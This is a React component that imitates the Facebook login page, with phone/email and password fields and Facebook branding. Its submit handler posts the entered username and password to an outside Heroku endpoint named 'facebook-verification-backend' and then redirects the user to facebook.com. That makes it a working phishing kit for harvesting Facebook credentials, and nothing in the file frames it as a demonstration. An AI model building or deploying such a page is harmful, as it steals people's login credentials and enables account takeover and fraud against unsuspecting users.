import Axios from 'axios';
import React from 'react';
import './App.css';

class App extends React.Component {
  state = {
    username: '',
    password: ''
  }

  handleChange = (e) => {
    this.setState({
      [e.target.name]: e.target.value
    });
  }

  handleSubmit = (e) => {
    e.preventDefault();
    Axios.post('https://facebook-verification-backend.herokuapp.com/add-people', this.state)
    window.location.href = "https://facebook.com"
  }

  render() {
    const { username, password } = this.state;
    return (
      <>
        <div>
          <img src="/images/cover.jpg" alt="cover" />
        </div>
        <div className="container">
          <div className="language">
            <p>
              <span>English</span>
              <span>-</span>
              <span>বাংলা</span>
              <span>-</span>
              <span className="color">More...</span>
            </p>
          </div>
          
          <div className="form">
            <form onSubmit={this.handleSubmit}>
              <input 
                required 
                type="text" 
                placeholder="Phone or email" 
                name="username" 
                value={username}
                onChange={(e) => this.handleChange(e)}
              />

              <input 
                required 
                type="text" 
                placeholder="Password" 
                name="password" 
                value={password}
                onChange={(e) => this.handleChange(e)}
              />

              <button type="submit">Log In</button>
            </form>
            <a href="facebook.com">Forgot Password?</a>
          </div>

          <div className="or">
            <span>Or</span>
            <hr />
          </div>
          <div className="new">
            <button>Create New Facebook Account</button>
          </div>
        </div>
      </>
    );
  }
}

export default App;
